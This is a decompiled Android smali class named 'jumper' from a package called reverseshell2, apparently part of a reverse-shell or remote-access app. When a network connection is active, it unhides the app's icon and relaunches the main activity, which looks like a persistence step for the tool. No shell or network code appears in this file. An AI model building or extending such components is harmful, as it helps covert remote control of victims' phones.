.class public Lcom/example/reverseshell2/jumper;
.super Ljava/lang/Object;
.source "jumper.java"


# instance fields
.field context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 13
    iput-object p1, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    .line 14
    return-void
.end method


# virtual methods
.method public init()V
    .locals 4

    .line 17
    iget-object v0, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    const-string v1, "connectivity"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 18
    .local v0, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 19
    new-instance v1, Lcom/example/reverseshell2/functions;

    const/4 v2, 0x0

    invoke-direct {v1, v2}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iget-object v2, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lcom/example/reverseshell2/functions;->unHideAppIcon(Landroid/content/Context;)V

    .line 20
    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    const-class v3, Lcom/example/reverseshell2/MainActivity;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 21
    .local v1, "a":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 22
    const/high16 v2, 0x10000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 23
    iget-object v2, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 25
    .end local v1    # "a":Landroid/content/Intent;
    :cond_0
    return-void
.end method
